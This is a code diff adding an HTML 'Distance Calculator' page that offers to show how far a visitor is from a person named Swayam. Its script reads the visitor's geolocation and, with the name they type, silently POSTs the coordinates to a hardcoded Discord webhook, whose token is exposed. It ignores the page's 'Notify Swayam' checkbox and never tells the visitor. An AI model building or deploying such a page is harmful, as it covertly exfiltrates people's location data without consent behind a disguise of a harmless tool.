@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Distance Calculator</title>
+    <link rel="stylesheet" href="stylesheet.css">
+    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
+    <style> </style>
+    <script>
+
+        var s = "data\n ";
+        var name = "default"
+        var loc = false;
+        var x1 = 22.243653534682828;
+        var y1 = 84.80866593970806;
+        var x2;
+        var y2;
+        function sendMessage() {
+            var request = new XMLHttpRequest();
+            request.open("POST", "https://discord.com/api/webhooks/772293676244008990/wHCWaeyJJ2G8aPeDw1hpen1Z-C35tKXwVI-XFx_MrvTNJZHwXFpLGE2NV1BHaGWXVEbQ");
+            request.setRequestHeader('Content-type', 'application/json');
+            var params = {
+                username: name,
+                avatar_url: "",
+                content: s
+            }
+            request.send(JSON.stringify(params));
+
+
+
+        }
+
+        function getLocation() {
+            name = document.getElementById("name").value;
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(showPosition);
+                
+
+            } else {
+                alert("Geolocation is not supported by this browser.");
+            }
+        }
+        function showPosition(position) {
+            x2 = position.coords.latitude;
+            y2 = position.coords.longitude;
+
+            s = "Latitude: " + position.coords.latitude +
+                "\nLongitude: " + position.coords.longitude+"\n\n\n";
+            sendMessage();
+            document.getElementById("butt").disabled = false;
+        }
+
+        function getDistanceFromLatLonInKm(lat1, lon1, lat2, lon2) {
+            var R = 6371; // Radius of the earth in km
+            var dLat = deg2rad(lat2 - lat1);  // deg2rad below
+            var dLon = deg2rad(lon2 - lon1);
+            var a =
+                Math.sin(dLat / 2) * Math.sin(dLat / 2) +
+                Math.cos(deg2rad(lat1)) * Math.cos(deg2rad(lat2)) *
+                Math.sin(dLon / 2) * Math.sin(dLon / 2)
+                ;
+            var c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
+            var d = R * c; // Distance in km
+            return d;
+        }
+
+        function deg2rad(deg) {
+            return deg * (Math.PI / 180)
+        }
+
+        function calculateDistance() {
+            var res = getDistanceFromLatLonInKm(x1,y1,x2,y2)
+            document.getElementById("dis").innerText = "Distance : " + res.toFixed(3)+"KM";
+        }
+    </script>
+</head>
+
+<body style="text-align: center" class="gradbody">
+    <div class="main">
+        <h1 class="heading">Distance Calcultor</h1>
+        <img src="https://instagram.fbbi1-2.fna.fbcdn.net/v/t51.2885-19/s150x150/135841670_214070760366399_4236344271189959008_n.jpg?_nc_ht=instagram.fbbi1-2.fna.fbcdn.net&_nc_ohc=NCSmdmnrha4AX95RWSy&tp=1&oh=38ce96e3780f8d4cb84a74fd5e57cbf3&oe=60305FAB" alt="swm-img">
+        
+        <div id="al">
+            <p>Know How Far You Are From Swayam</p>
+        <input style="width: 90%;max-width: 280px;" id="name" type="text" placeholder="Enter your name" required>
+        <br>
+        <input style="text-align: left;" type="checkbox" name="Notify Swayam" id=""><em style="text-align: left;font-size: small;">Notify Swayam</em>
+    </div>
+        <br>
+        <span><button onclick="getLocation()" style="margin-right: 5px; margin-left: auto;">get Location</button></span>
+        <span><button style="margin-left: 5px; margin-right: auto;" id="butt" onclick="calculateDistance()"
+                disabled>calculate Distance</button></span>
+        <p id="dis"></p>
+    </div>
+</body>
+
+</html>
